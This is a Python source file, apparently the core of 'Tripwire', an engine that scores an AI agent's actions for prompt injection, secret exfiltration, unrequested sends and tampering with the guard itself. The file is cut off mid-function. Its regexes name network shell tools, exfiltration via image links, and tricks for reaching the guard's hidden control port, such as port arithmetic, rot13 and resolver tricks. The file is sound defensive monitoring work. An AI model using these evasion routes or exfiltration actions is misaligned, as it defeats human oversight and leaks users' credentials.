"""The decision engine: one Action in, one Verdict out.

Pipeline: classify -> capability checks -> shell AST -> provenance (taint) ->
policy overrides -> score -> optional isolated judge for the grey zone.
Deterministic first. The judge never sees untrusted data, so it cannot be injected.
"""

from __future__ import annotations

import json
import os
import re
import shlex
import time
from typing import Any, Callable

from . import autonomy as auto
from .analyzers import paths
from .analyzers.secrets import find_secrets, redact
from .analyzers.shell import CONFUSABLE, analyze_code, analyze_shell
from .taint import IBAN, INJECTION_MARKERS, MAX_OBSERVE, canon, indicators
from .classify import classify
from .models import (
    CRITICAL, HIGH, LOW, MEDIUM, Action, Capability, Decision, Finding, Observation, TaskSpec, Verdict,
)
from .policy import Policy
from .session import Session, SessionStore

BLOCK_AT = HIGH  # 80
ASK_AT = MEDIUM  # 50

PATH_KEYS = ("file_path", "path", "notebook_path", "filename", "file", "target", "destination", "source")
CMD_KEYS = ("command", "cmd", "script", "code")
ARGV_KEYS = ("argv", "args", "arguments", "command", "cmd")
SINKS = {Capability.SEND, Capability.MONEY, Capability.EXEC, Capability.DELETE, Capability.WRITE, Capability.AGENT}
HIGH_IMPACT = {Capability.SEND, Capability.MONEY, Capability.DELETE, Capability.CREDENTIAL, Capability.AGENT}
MAX_ARGS_CHARS = 200_000  # beyond this an action is too big to check fully, so a human decides
MAX_NEST = 32
# Any argument key that names a file or folder, e.g. "uri", "glob", "include", "paths", "src".
PATHISH_KEY = re.compile(r"(?:^|_)(path|file|dir|folder|uri|glob|include|target|dest|source|src|location)")
# Argument keys that say who a message or payment goes to.
DEST_URL_KEY = re.compile(r"^(url|uri|endpoint|webhook(_url)?|target(_url)?|destination|server|host)$", re.I)
RECIPIENT_KEY = re.compile(r"^(to|cc|bcc|recipients?|emails?|email_address(es)?|address(es)?|participants?|attendees?|"
                           r"invitees?|users?|members?|phone|phone_number|number|iban|account|payee|beneficiary|channel|reply_to)$", re.I)
# A picture or link inside a message body: the reader's mail app or chat loads it, sending the URL's data away.
# The daemon's own API: an agent that can reach it can reset sessions, rewrite its task or approve its own ASKs.
LOCAL_ADDR = (r"(?:localhost|127(?:\.\d{1,3}){1,3}|0\.0\.0\.0|0x7f[0-9a-f.x]{0,24}|2130706433|0177(?:\.\d{1,4}){0,3}|"
              r"\[?(?:0{0,4}:){1,7}0{0,3}1\]?|\[?::ffff:127\.[\d.]{1,12}\]?|[\w.-]{1,64}\.localhost|host\.docker\.internal)")
DAEMON_API = re.compile(r"/v1/(?:task|observe|evaluate|reset|verdicts|settings|rules|sessions)\b", re.I)
GUARD_HOME = re.compile(r"(?:^|[\s/~\"'=:}])\.tripwire(?:/|$)", re.I)
# Names only an attack on the guard needs: its auth header, cookie, token variable, or the browser header that once
# earned the cookie.
GUARD_WORDS = re.compile(r"x-tripwire-token|tripwire_(?:token|dash)\b|\bTRIPWIRE_TOKEN\b|sec-fetch-(?:dest|site|mode)|"
                         r"/v1/pair\b", re.I)
# A command that talks over the network (shell clients, or an interpreter that could).
NET_CALL = re.compile(r"(?<![\w/.-])(?:curl|wget|nc|ncat|netcat|socat|telnet|https?|xh|httpie|python[\d.]{0,4}|node|nodejs|deno|bun|"
                      r"ruby|perl|php|pwsh|powershell|osascript|openssl|urlopen|requests|httpx|aiohttp|axios|fetch|"
                      r"Invoke-WebRequest|Invoke-RestMethod|iwr|irm|websocat|grpcurl|ab|hey|lynx|w3m)(?![\w:/.-])", re.I)
ARITH = re.compile(r"\$\(\(\s{0,4}([\d\s+\-*/()]{1,60}?)\s{0,4}\)\)")
# A local address whose port is worked out at run time ($P, ${P}, $((..)), `..`, %d, {port}, "..."+p).
LOCAL_DYN_PORT = re.compile(LOCAL_ADDR + r"\s{0,3}(?::\s{0,3}[\"']?\s{0,2}(?:[$`{%(]|\+)|[\"']\s{0,3}(?:\+|%|\.\s{0,3}\$)|"
                            r"\s{1,3}[\"']?\$)", re.I)
DYN_HOST_PORT = re.compile(r"://[\"']?\$[\w{(][^\s/:]{0,80}:\s{0,3}[\"']?[$`{%(]")
PUBLIC_HOST = re.compile(r"(?:[a-z0-9-]{1,63}\.){1,8}[a-z]{2,24}", re.I)
# Personal data that has no business going to a stranger: SSNs, bank routing and account numbers, card numbers, IBANs,
# passwords spelled out.
PII = [
    ("a Social Security number", re.compile(r"(?<![\d-])\d{3}-\d{2}-\d{4}(?![\d-])")),
    ("a bank routing number", re.compile(r"\b(?:routing|aba|sort code)\b\D{0,24}\d{6,9}\b", re.I)),
    ("a bank account number", re.compile(r"\b(?:acct|account)(?:\s{0,2}(?:no|number|#))?\.?\D{0,8}\d{6,17}\b", re.I)),
    ("a password", re.compile(r"\b(?:password|passcode|passwd)\s{0,3}(?:is|:|=)\s{0,3}\S{4,}", re.I)),
    ("an IBAN", IBAN),
]
CARD = re.compile(r"(?<![\d-])(?:\d[ -]?){12,18}\d(?![\d-])")
B64_TOKEN = re.compile(r"(?<![A-Za-z0-9+/_=-])[A-Za-z0-9+/_-]{16,4096}={0,2}(?![A-Za-z0-9+/_=-])")
HEX_TOKEN = re.compile(r"(?<![0-9a-fA-F])(?:[0-9a-fA-F]{2}){12,2048}(?![0-9a-fA-F])")
SECRET_LINE = re.compile(r"^[ \t]{0,8}(?:export[ \t]{1,4})?[A-Za-z_][A-Za-z0-9_.-]{0,64}[ \t]{0,4}[=:][ \t]{0,4}[\"']?([^\s\"'#]{10,512})",
                         re.M)
GIT_EGRESS = re.compile(r"\bgit\b[^;&|\n]{0,200}\bpush\b|\bgh\s{1,4}(?:pr|issue|release|gist|api)\b|\b(?:curl|wget|nc|scp|rsync)\b")
# Commands that send something off this computer, including a bare DNS lookup (a name is data too).
EGRESS_CMD = re.compile(r"(?<![\w/.-])(?:curl|wget|nc|ncat|netcat|socat|telnet|ssh|scp|sftp|rsync|ftp|tftp|http|https|xh|"
                        r"dig|nslookup|host|drill|ping6?|traceroute|whois|mail|mailx|sendmail|mutt)(?![\w/.-])|"
                        r"urlopen|requests\.|httpx|aiohttp|\bfetch\s{0,4}\(|axios|gethostbyname|getaddrinfo|smtplib|"
                        r"Invoke-(?:WebRequest|RestMethod)")
GIT_RECORD = re.compile(r"\bgit\b[^;&|\n]{0,200}\b(?:commit|tag|notes)\b")
INVITE_WORDS = re.compile(r"\b(?:event|meeting|invite\w*|schedule\w*|participants?|attendees?|calendar|appointment|"
                          r"lunch|dinner|call|sync|share\w*)\b", re.I)
HOOK_WORDS = re.compile(r"\b(?:pre-commit|pre-push|commit-msg|prepare-commit-msg|post-commit|post-merge|post-checkout|"
                        r"pre-rebase|git hooks?|\.git/hooks)\b", re.I)


def _daemon_port_re(ports: set[int]) -> re.Pattern[str]:
    alt = "|".join(str(p) for p in sorted(ports))
    return re.compile(rf"{LOCAL_ADDR}\s{{0,3}}(?::|\s{{1,3}}|,\s{{0,3}}|\s{{0,3}}-p\s{{0,3}})\s{{0,3}}(?:{alt})\b", re.I)


RENDER_EXFIL = re.compile(r"!\[[^\]\n]{0,200}\]\(\s{0,4}(https?://[^\s)]{1,2048})|<img\b[^>]{0,300}?\bsrc\s{0,4}=\s{0,4}[\"']?(https?://[^\s\"'>]{1,2048})", re.I)


def _strings(value: Any, depth: int = 0) -> list[str]:
    if depth > MAX_NEST:
        raise ValueError("arguments nested too deeply")
    if isinstance(value, str):
        return [value]
    if isinstance(value, dict):
        return [str(k) for k in value] + [s for v in value.values() for s in _strings(v, depth + 1)]
    if isinstance(value, (list, tuple)):
        return [s for v in value for s in _strings(v, depth + 1)]
    return [str(value)] if value is not None else []


def _keyed(value: Any, key_re: re.Pattern[str], depth: int = 0, hit: bool = False) -> list[str]:
    """String values that sit under a key matching `key_re`, at any depth (e.g. {"files": [{"uri": ...}]})."""
    if depth > MAX_NEST:
        return []
    if isinstance(value, str):
        return [value] if hit else []
    if isinstance(value, dict):
        return [s for k, v in value.items() for s in _keyed(v, key_re, depth + 1, hit or bool(key_re.search(_key(k))))]
    if isinstance(value, (list, tuple)):
        return [s for v in value for s in _keyed(v, key_re, depth + 1, hit)]
    return []


def _key(k: Any) -> str:
    return re.sub(r"([a-z0-9])([A-Z])", r"\1_\2", str(k)[:64]).lower().replace("-", "_")


def _command(args: dict[str, Any], blob: str) -> str:
    """The shell command an exec tool will run, however the tool spells it: a string, an argv list,
    or a program plus an args list ({"command": "curl", "args": [...]})."""
    base = _first(args, CMD_KEYS)
    for k in ARGV_KEYS:
        v = args.get(k)
        if isinstance(v, (list, tuple)) and v and all(isinstance(x, (str, int, float)) for x in v):
            argv = shlex.join(str(x) for x in v)
            return f"{base} {argv}" if base and k not in ("command", "cmd") else argv
    return base or blob


def _file_paths(args: dict[str, Any]) -> list[str]:
    out: list[str] = []
    for v in _keyed(args, PATHISH_KEY):
        if len(v) > 4096 or "\n" in v:
            continue
        if v.lower().startswith("file://"):
            v = v[7:]
        elif "://" in v:
            continue
        out.append(v)
    return out


def _source_label(s, tool: str) -> str:
    """Name the thing a tool output came from, e.g. "README.md" or a URL, from the last call to that tool."""
    for v in reversed(s.history):
        if v.action.tool != tool:
            continue
        target = _first(v.action.args, PATH_KEYS) or _first(v.action.args, ("url", "uri", "endpoint"))
        if not target:
            break
        cwd = s.cwd or ""
        if cwd and target.startswith(cwd.rstrip("/") + "/"):
            target = target[len(cwd.rstrip("/")) + 1:]
        if len(target) <= 80:
            return target
        break
    low = tool.lower()
    for words, name in (("inbox mail message", "an email"), ("web fetch url http browse", "a web page"),
                        ("file read cat", "a file"), ("search", "a search result")):
        if any(w in low for w in words.split()):
            return name
    return ""


def _first(args: dict[str, Any], keys: tuple[str, ...]) -> str | None:
    for k in keys:
        if isinstance(args.get(k), str):
            return args[k]
    return None


class Engine:
    def __init__(self, policy: Policy | None = None, judge: Callable[[Session, Action, Verdict], dict] | None = None,
                 autonomy: str | None = None, learned: auto.LearnedStore | None = None) -> None:
        self.sessions = SessionStore()
        self.policy = policy or Policy.load()
        self.judge = judge
        self.listeners: list[Callable[[str, dict], None]] = []
        # strict | balanced | autonomous. None means "not chosen": balanced, or $TRIPWIRE_AUTONOMY.
        self.autonomy_explicit = autonomy is not None
        self.autonomy = auto.normalise_level(autonomy)
        # Ports the daemon listens on. An agent action aimed at them is an attack on the guard itself.
        self.guard_ports = {7777, int(os.environ.get("TRIPWIRE_PORT") or 7777)}
        self._port_re = _daemon_port_re(self.guard_ports)
        # Learned rules start empty in-process (benchmarks and tests stay reproducible); the daemon loads learned.yaml.
        self.learned = learned or auto.LearnedStore()

    def set_guard_port(self, port: int) -> None:
        from .analyzers import shell as _shell
        self.guard_ports.add(int(port))
        _shell.GUARD_PORTS.add(int(port))
        self._port_re = _daemon_port_re(self.guard_ports)

    def set_autonomy(self, level: str) -> str:
        self.autonomy = auto.normalise_level(level)
        self.autonomy_explicit = True
        self._emit("settings", {"autonomy": self.autonomy})
        return self.autonomy

    def learn(self, v: Verdict, decision: Decision, scope: str) -> auto.LearnedRule:
        """Remember a human's answer as a narrow rule. Raises autonomy.LearnRefused with a plain reason."""
        s = self.sessions._s.get(v.action.session_id)
        return self.learned.add(v, decision, scope, s)

    # ---- inputs -------------------------------------------------------------
    def set_task(self, spec: TaskSpec, verified: bool = True) -> None:
        self.sessions.get(spec.session_id, spec.cwd).set_task(spec.prompt, spec.cwd, spec.profile, verified)
        self._emit("task", spec.model_dump())

    def observe(self, obs: Observation) -> None:
        s = self.sessions.get(obs.session_id)
        label = _source_label(s, obs.tool)
        s.taint.add_untrusted(obs.tool, obs.output, label)
        # Key material showing up in any output (Grep "API_KEY", an MCP file reader, a log) means the agent
        # now holds a secret, whichever tool fetched it.
        leaked = find_secrets(obs.output[:MAX_OBSERVE])
        if leaked:
            s.secrets_read.append(f"{label or obs.tool} ({leaked[0].replace('_', ' ')})")
        # An output for the call we just judged means the human let that call run. Only the latest call
        # counts: a later output from the same tool (reading README after a denied .env read) proves nothing.
        hit = s.pending_secrets.get(s.last_verdict_id or "")
        if hit and hit[0] == obs.tool:
            s.secrets_read.append(hit[1])
            del s.pending_secrets[s.last_verdict_id]
        last = s.history[-1] if s.history else None
        from_secret = bool(hit and hit[0] == obs.tool) or bool(
            last and last.action.tool == obs.tool and any(f.rule in ("secrets.read", "shell.secret_read") for f in last.findings))
        if leaked or from_secret:
            # Keep the values themselves, so an encoded copy (base64 in a commit message) is still recognised.
            for m in SECRET_LINE.finditer(obs.output[:200_000]):
                if len(s.secret_values) < 500 and not re.fullmatch(r"(?:true|false|null|none|localhost|[\d.]+)", m.group(1), re.I):
                    s.secret_values.add(m.group(1))
        self._emit("observe", {"session_id": obs.session_id, "tool": obs.tool, "source": label or obs.tool,
                               "bytes": len(obs.output), "injection": bool(s.taint.injection_seen)})

    def resolve(self, verdict_id: str, decision: Decision) -> None:
        """A human (or a timeout) answered an ASK."""
        for s in self.sessions.all():
            hit = s.pending_secrets.pop(verdict_id, None)
            if hit and decision == Decision.ALLOW:
                s.secrets_read.append(hit[1])

    def evaluate(self, action: Action) -> Verdict:
        try:
            return self._evaluate(action)
        except Exception as e:  # fail closed: an engine bug must never let an action through
            try:
                shown = _redacted(action)
            except Exception:  # args too odd to even redact (e.g. nested thousands deep): show none of them
                shown = action.model_copy(update={"args": {"_": "arguments not shown"}})
            v = Verdict(action=shown, capability=Capability.UNKNOWN, decision=Decision.BLOCK, risk=100,
                        summary="Blocked: Tripwire could not check this action, so it was stopped to be safe.",
                        findings=[Finding(rule="engine.error", severity=CRITICAL, category="general",
                                          message=f"Internal check failed ({type(e).__name__}); failing closed.")])
            self._emit("verdict", v.model_dump(mode="json"))
            return v

    def _evaluate(self, action: Action) -> Verdict:
        t0 = time.perf_counter()
        s = self.sessions.get(action.session_id, action.cwd)
        cap = _effective_cap(classify(action.tool, self.policy.capabilities), action.args or {})
        shell_state: dict = {}
        findings = self._analyze(action, cap, s, shell_state)

        findings += self._profile(action, cap, s)
        if cap == Capability.MONEY and not any(f.severity >= ASK_AT for f in findings):
            findings.append(Finding(rule="impact.money", severity=ASK_AT, category="scope",
                                    message="Moving money always needs a human to confirm."))
        # Once hidden instructions have shown up, a high-impact action the user never asked for is
        # almost certainly the attacker's, so don't hand the human a coin-flip prompt: stop it.
        if (s.taint.injection_seen and cap in HIGH_IMPACT and not s.intends(cap)
                and any(ASK_AT <= f.severity < BLOCK_AT for f in findings)):
            src = s.taint.injection_seen[-1]
            findings.append(Finding(rule="chain.injected_unrequested", severity=BLOCK_AT, category="injection",
                                    message=f"Hidden instructions were found in {src.where}, and you never asked to {_verb(cap)}.",
                                    evidence=src.snippet))

        risk = max((f.severity for f in findings), default=0)
        risk = min(100, risk + 5 * max(0, sum(f.severity >= HIGH for f in findings) - 1))
        decision = Decision.BLOCK if risk >= BLOCK_AT else Decision.ASK if risk >= ASK_AT else Decision.ALLOW

        override = self.policy.match(action, cap)
        if override:
            decision = Decision(override.decision)
            findings.append(Finding(rule=f"policy.{override.id}", severity=risk, category="policy",
                                    message=override.reason or f"Policy rule '{override.id}' says {override.decision}."))

        v = Verdict(action=_redacted(action), capability=cap, decision=decision, risk=risk, findings=findings,
                    summary=_summary(decision, findings, cap), autonomy=self.autonomy)

        # Autonomy: only ever turns an ASK into a decision; never touches a BLOCK or an explicit policy rule.
        if decision == Decision.ASK and not override and self.autonomy != "strict":
            res = None
            rule = self.learned.match(action, cap, s.cwd)
            if rule is not None:
                res = auto.apply_learned(rule, s, cap, findings)
            if res is None:
                ctx = auto.Context()
                if cap == Capability.EXEC and s.taint.injection_seen:
                    src = s.taint.command_from_data(_command(action.args or {}, ""))
                    ctx.command_src_injected = bool(src and src.injected)
                res = auto.decide(self.autonomy, s, action, cap, findings, ctx)
            if res is not None:
                v.findings.append(res.finding)
                v.decision, v.auto, v.rule_id = res.decision, True, res.rule_id
                if res.decision == Decision.BLOCK:
                    v.risk = max(v.risk, BLOCK_AT)
                v.summary = res.finding.message

        if self.judge and v.decision == Decision.ASK and not override:
            try:
                j = self.judge(s, action, v)
                v.judge = j
                if j.get("decision") in ("allow", "block"):
                    v.decision = Decision(j["decision"])
                    v.summary = f"{v.summary} Judge: {j.get('reason', '')}".strip()
            except Exception as e:  # judge is optional; a broken judge must never weaken the verdict
                v.judge = {"error": str(e)}

        v.elapsed_ms = round((time.perf_counter() - t0) * 1000, 2)
        if v.decision != Decision.BLOCK:
            # Files that now hold a copy of a secret stay secret for the rest of the session,
            # so `cp .env notes.txt` now and `git push` / `gh gist create notes.txt` later is still caught.
            s.tainted_files |= shell_state.get("tainted_files", set())
            for x in shell_state.get("staged_secrets", []):
                if x not in s.staged_secrets:
                    s.staged_secrets.append(x)
        # Risky code is remembered even when its write was blocked: if the file shows up some other way, running it
        # is still judged by what it does.
        for k, val in (shell_state.get("risky_written") or {}).items():
            if k not in s.risky_written or s.risky_written[k][0] < val[0]:
                s.risky_written[k] = val
        if v.decision != Decision.BLOCK and len(s.agent_written) < 5000:
            # Files the agent wrote (Write/Edit, shell redirects, copies, patches): running one later is running its code.
            if cap == Capability.WRITE:
                s.agent_written.update(_norm_path(p, s) for p in _file_paths(action.args or {})[:20])
            s.agent_written.update(list(shell_state.get("agent_written") or ())[:50])
            s.agent_written.update(_norm_path(tgt, s) for tgt, _ in (shell_state.get("writes") or [])[:50])
        if any(f.rule == "secrets.read" for f in findings):
            target = next((p for p in _file_paths(action.args or {}) if paths.is_secret(paths.expand(p, s.cwd))),
                          None) or _first(action.args, PATH_KEYS) or action.tool
            if v.decision == Decision.ALLOW:
                s.secrets_read.append(target)
            elif v.decision == Decision.ASK:  # not read yet: a denied read must not taint the rest of the session
                s.pending_secrets[v.id] = (action.tool, target)
        s.history.append(v)
        s.last_verdict_id = v.id
        self._emit("verdict", v.model_dump(mode="json"))
        return v

    # ---- permission profile ------------------------------------------------
    def _profile(self, a: Action, cap: Capability, s: Session) -> list[Finding]:
        if not s.profile:
            return []
        prof = self.policy.profiles.get(s.profile)
        if prof is None:
            return [Finding(rule="profile.unknown", severity=CRITICAL, category="scope",
                            message=f"Permission profile '{s.profile}' does not exist, so nothing is allowed.")]
        verdict = prof.check(a.tool, cap)
        if verdict == "deny":
            return [Finding(rule="profile.denied", severity=CRITICAL, category="permission",
                            message=f"The '{s.profile}' role is not allowed to {_verb(cap)} ({a.tool}).")]
        if verdict == "outside":
            return [Finding(rule="profile.outside", severity=HIGH + 5, category="permission",
                            message=f"'{a.tool}' is not one of the tools the '{s.profile}' role was given.")]
        if verdict == "ask":
            return [Finding(rule="profile.ask", severity=ASK_AT, category="permission",
                            message=f"The '{s.profile}' role needs your OK to {_verb(cap)}.")]
        return []

    # ---- analysis -----------------------------------------------------------
    def _analyze(self, a: Action, cap: Capability, s: Session, shell_state: dict | None = None) -> list[Finding]:
        f: list[Finding] = []
        args = a.args or {}
        strings = _strings(args)
        size = sum(len(x) for x in strings)
        blob = "\n".join(strings)
        if size > MAX_ARGS_CHARS:
            blob = blob[:MAX_ARGS_CHARS]
            f.append(Finding(rule="input.too_big", severity=ASK_AT, category="general",
                             message=f"This action is too big to check fully ({size:,} characters), so it needs your OK."))
        file_paths = _file_paths(args)
        path = _first(args, PATH_KEYS) or (file_paths[0] if file_paths else None)
        injected = bool(s.taint.injection_seen)

        if cap == Capability.EXEC:
            cmd = _command(args, blob)
            shell = analyze_shell(cmd, s, shell_state)
            f += shell
            src = s.taint.command_from_data(cmd)
            if src:
                # READMEs legitimately say "run npm test". Copying a command from data is only
                # dangerous when the command itself is risky, or is unfamiliar after an injection.
                risky = any(x.severity >= MEDIUM for x in shell)
                if risky:
                    sev = HIGH + 5
                elif _is_routine(cmd):
                    sev = 0
                else:
                    sev = MEDIUM if s.taint.injection_seen else LOW
                if sev:
                    f.append(Finding(rule="taint.command_from_data", severity=sev, category="injection",
                                     message=f"This exact command was written inside content the agent read ({src.where}), not by you.",
                                     evidence=src.snippet))
            f += self._shell_egress(cmd, s, shell_state or {}, injected)
            f += _runs_risky_written(cmd, s)
            f += _shell_writes_and_runs(s, shell_state if shell_state is not None else {}, injected)

        for path in file_paths if cap != Capability.EXEC else []:
            full = paths.expand(path, s.cwd)
            if paths.is_secret(full) and not s.taint.names_path(path, s.cwd):
                sev = MEDIUM + 5 if cap == Capability.READ else HIGH
                f.append(Finding(rule="secrets.read" if cap == Capability.READ else "secrets.touch", severity=sev,
                                 category="secrets", message=f"Touches a credential file you did not mention: {path}"))
            elif os.path.normpath(full) in s.tainted_files and cap not in (Capability.WRITE, Capability.DELETE):
                f.append(Finding(rule="secrets.read", severity=MEDIUM + 5, category="secrets",
                                 message=f"Reads {path}, which holds a copy of a credential file."))
            if cap in (Capability.WRITE, Capability.DELETE):
                if paths.is_persistence(full):
                    asked = _asked_for_persistence(s, path, full)
                    if asked and not injected:
                        # "Add a pre-commit hook that runs ruff": you asked for exactly this, so the content checks
                        # below decide. After hidden instructions it stays blocked.
                        f.append(Finding(rule="scope.persistence_requested", severity=LOW, category="persistence",
                                         message=f"Changes {path}, which runs later. You asked for this."))
                    else:
                        f.append(Finding(rule="scope.persistence", severity=HIGH + 5, category="persistence",
                                         message=f"Changes a file that controls what runs on your machine later: {path}"))
                elif paths.is_system(full):
                    f.append(Finding(rule="scope.system_write", severity=HIGH, category="scope",
                                     message=f"Writes to a system folder: {path}"))
                elif not s.in_workspace(full):
                    f.append(Finding(rule="scope.outside_workspace", severity=MEDIUM, category="scope",
                                     message=f"Writes outside the project folder: {path}"))

        if cap == Capability.WRITE and file_paths:
            f += _written_code_findings(file_paths[0], args, s, injected, shell_state)
            f += _written_secret_findings(file_paths[0], "\n".join(_keyed(args, CONTENT_KEY)), s, shell_state)

        if cap in (Capability.SEND, Capability.MONEY, Capability.FETCH, Capability.EXEC, Capability.AGENT):
            leaked = find_secrets(blob)
            if leaked:
                f.append(Finding(rule="secrets.egress", severity=CRITICAL, category="exfiltration",
                                 message=f"Sends secret material out ({_secret_kinds(leaked)})."))
            else:
                f += _encoded_secret_findings(blob, cap, s, shell_state)
        if cap == Capability.WRITE and file_paths and shell_state is not None and find_secrets(blob):
            # Secret text written into a file: that file is now a secret too (a later push or upload leaks it).
            shell_state.setdefault("tainted_files", set()).update(
                os.path.normpath(paths.expand(p, s.cwd)) for p in file_paths)

        # A calendar invite, a share or a meeting is a message to its attendees: same recipient rules as a send.
        invite = cap in (Capability.WRITE, Capability.UNKNOWN, Capability.READ, Capability.FETCH) and _has_recipients(args)
        if invite:
            f += self._invite(args, blob, s, injected)
        if cap in (Capability.SEND, Capability.MONEY, Capability.FETCH, Capability.AGENT) or (cap == Capability.WRITE and not path):
            # Judge every value that came from content, not just one: which value counts first must never depend
            # on set order (review 4: the same call was ASK or BLOCK depending on PYTHONHASHSEED).
            best: tuple[int, str, str, object] | None = None
            # The person you asked to reply to is your pick, not the content's: judged in _recipients instead.
            targets = s.reply_targets() if cap == Capability.SEND else {}
            for v, src in s.taint.tainted_values(blob):
                if v in targets:
                    continue
                sev, msg = _taint_target(cap, _as_written(v, blob), src, s, args, injected)
                # Ties: the longer value is the more specific one (an IBAN beats the digit run inside it).
                if sev and (best is None or (sev, len(v)) > (best[0], len(best[1]))):
                    best = (sev, v, msg, src)
            if best:
                f.append(Finding(rule=f"taint.{cap.value}_target", severity=best[0], category="injection",
                                 message=best[2], evidence=best[3].snippet))
            f += self._recipients(args, cap, s, injected)
            tmpl = s.taint.template_source(blob) if cap in (Capability.SEND, Capability.FETCH) else None
            if tmpl:
                f.append(Finding(rule="taint.url_template", severity=HIGH + 5 if tmpl[1].injected else MEDIUM,
                                 category="exfiltration", evidence=tmpl[1].snippet,
                                 message=f"Fills in a web address from {tmpl[1].where} with extra data ({tmpl[0][:80]}), "
                                         "a common way to sneak data out."))
            if cap == Capability.FETCH and injected and not any(x.category in ("injection", "exfiltration") for x in f):
                novel = [u for u in indicators(blob).get("url", ()) if not s.taint.is_trusted_value(u)
                         and not s.taint.is_trusted_value(_url_host(u))]
                if novel:
                    f.append(Finding(rule="taint.fetch_after_injection", severity=MEDIUM, category="injection",
                                     message=f"Visits {novel[0][:80]}, which you never named, after hidden instructions were found."))
            if cap == Capability.SEND:
                for m in RENDER_EXFIL.finditer(blob):
                    u = canon(m.group(1) or m.group(2))
                    if ("?" in u or "=" in u) and not s.taint.is_trusted_value(u):
                        f.append(Finding(rule="exfil.render_link", severity=MEDIUM, category="exfiltration",
                                         message=f"The message embeds an image link that sends data to {_url_host(u)} "
                                                 "as soon as someone opens it.", evidence=u[:160]))
                        break
            if cap == Capability.SEND:
                f += _pii_findings(args, blob, s, injected)
            if s.secrets_read and cap in (Capability.SEND, Capability.FETCH):
                read = _secret_names(s.secrets_read)
                if cap == Capability.SEND and not injected and _only_named_recipients(args, s) \
                        and not _carries_secret(blob, s):
                    # Your own message to someone you named, with nothing from the secret in it: worth a look, not a
                    # hard stop (QA: the summary email to sam@ was blocked after you approved reading .env).
                    f.append(Finding(rule="chain.secret_then_egress", severity=MEDIUM, category="exfiltration",
                                     message=f"Sends a message after reading secrets ({read}). It goes to someone you "
                                             "named and holds none of the secret, but check it."))
                else:
                    f.append(Finding(rule="chain.secret_then_egress", severity=HIGH + 10 if cap == Capability.SEND else HIGH,
                                     category="exfiltration",
                                     message=f"Sends data out after reading secrets ({read})."))

        if cap == Capability.AGENT:
            m = INJECTION_MARKERS.search(blob)
            if m:
                f.append(Finding(rule="taint.agent_forwards_injection", severity=HIGH + 5, category="injection",
                                 message="Starts a helper agent with orders that look like hidden instructions, not your task.",
                                 evidence=m.group(0)))
            # Orders copied from something the agent read (whole lines, or a run of six words reworded around the
            # edges) are checked like a send: from hidden instructions it is blocked, from any other content it asks.
            src = s.taint.command_from_data(blob) or s.taint.copied_from_data(blob)
            if src:
                secretish = any(paths.is_secret(paths.expand(t, s.cwd)) for t in re.findall(r"[~./\w-]{0,200}/[\w./-]{1,200}", blob))
                sev = HIGH if src.injected or secretish else MEDIUM
                f.append(Finding(rule="taint.agent_from_data", severity=sev, category="injection",
                                 message=f"Starts a helper agent with orders copied from {src.where}, not from you"
                                         + (", and they touch a credential file." if secretish else "."),
                                 evidence=src.snippet))

        if cap == Capability.AGENT and not any(x.rule.startswith("taint.agent") for x in f):
            f += _agent_paraphrase(blob, s, injected)

        if cap == Capability.CREDENTIAL:
            f.append(Finding(rule="impact.credential", severity=ASK_AT if s.intends(cap) else HIGH, category="secrets",
                             message="Changes a password, key or login setting." if s.intends(cap)
                             else "Tries to change a password or login setting you never asked about."))

        f += self._guard_tamper(a, cap, s, blob, file_paths)

        if not s.task and cap in HIGH_IMPACT and cap != Capability.CREDENTIAL:
            # No trusted task means nothing to compare against: fail closed on anything that leaves a mark.
            f.append(Finding(rule="intent.no_task", severity=ASK_AT, category="scope",
                             message=f"No task from you was recorded for this session, so Tripwire can't tell "
                                     f"whether you wanted it to {_verb(cap)}."))

        if cap in (Capability.SEND, Capability.MONEY, Capability.DELETE) and s.task and not s.intends(cap):
            sev = {Capability.MONEY: HIGH, Capability.DELETE: MEDIUM + 10, Capability.SEND: MEDIUM}[cap]
            f.append(Finding(rule=f"intent.unrequested_{cap.value}", severity=sev, category="scope",
                             message=f"Your task never asked to {_verb(cap)}."))

        if injected and f and (cap in SINKS or any(x.category == "secrets" for x in f)):
            src = s.taint.injection_seen[-1]
            f.append(Finding(rule="taint.injection_context", severity=max(x.severity for x in f) + 5, category="injection",
                             message=f"Hidden instructions were found in {src.where} earlier in this session.",
                             evidence=src.snippet))

        if cap == Capability.UNKNOWN:  # fail closed: if we can't tell what a tool does, a human decides
            f.append(Finding(rule="classify.unknown", severity=ASK_AT, category="general",
                             message=f"Tripwire doesn't know what '{a.tool}' does, so it needs your OK."))
        return f

    def _guard_tamper(self, a: Action, cap: Capability, s: Session, blob: str, file_paths: list[str]) -> list[Finding]:
        """Anything aimed at Tripwire itself: its API on the daemon's port, or its files in ~/.tripwire."""
        out: list[Finding] = []
        if cap in (Capability.EXEC, Capability.FETCH, Capability.SEND, Capability.AGENT, Capability.UNKNOWN,
                   Capability.MONEY, Capability.CREDENTIAL):
            raw_text = canon(blob[:MAX_ARGS_CHARS])
            # $((7700+77)) is just 7777: work out shell arithmetic before looking for the port. The arithmetic itself,
            # in a local port, is still hiding the port, so the raw text is checked too.
            text = ARITH.sub(lambda m: _arith(m.group(1)) or m.group(0), raw_text)
            netty = cap != Capability.EXEC or bool(NET_CALL.search(text))
            m = self._port_re.search(text)
            if not m:
                api = DAEMON_API.search(text)
                ports = "|".join(str(p) for p in sorted(self.guard_ports))
                # Tripwire's own API path on a local address, or on the daemon's port under any name.
                if api and (re.search(LOCAL_ADDR, text, re.I) or re.search(rf":0{{0,4}}(?:{ports})\b", text)):
                    m = api
            if not m and netty:
                m = LOCAL_DYN_PORT.search(raw_text) or self._any_daemon_port(text)
            if m:
                out.append(Finding(rule="guard.tamper_api", severity=CRITICAL, category="scope", evidence=m.group(0)[:120],
                                   message="Tries to talk to Tripwire's own control panel, or to a local port it hides "
                                           "so it can't be checked."))
            elif netty and DYN_HOST_PORT.search(text):
                out.append(Finding(rule="guard.tamper_api", severity=HIGH, category="scope",
                                   evidence=DYN_HOST_PORT.search(text).group(0)[:120],
                                   message="Connects to an address and port that are both worked out at run time, "
                                           "so Tripwire can't tell whether it is its own control panel."))
            if not m and netty:
                hit = _resolver_tricks(text, self.guard_ports)
                if hit:
                    out.append(Finding(rule="guard.tamper_api", severity=CRITICAL, category="scope", evidence=hit[:120],
                                       message="Points a web address at this computer by a trick (a name that leads "
                                               "back here, --resolve, or a Host header), which is how Tripwire's own "
                                               "control panel would be reached."))
            if re.search(r"rot.?13|codecs", text, re.I):
                import codecs
                rot = codecs.decode(text, "rot13")
                r = DAEMON_API.search(rot) or GUARD_WORDS.search(rot) or GUARD_HOME.search(rot)
                if r:
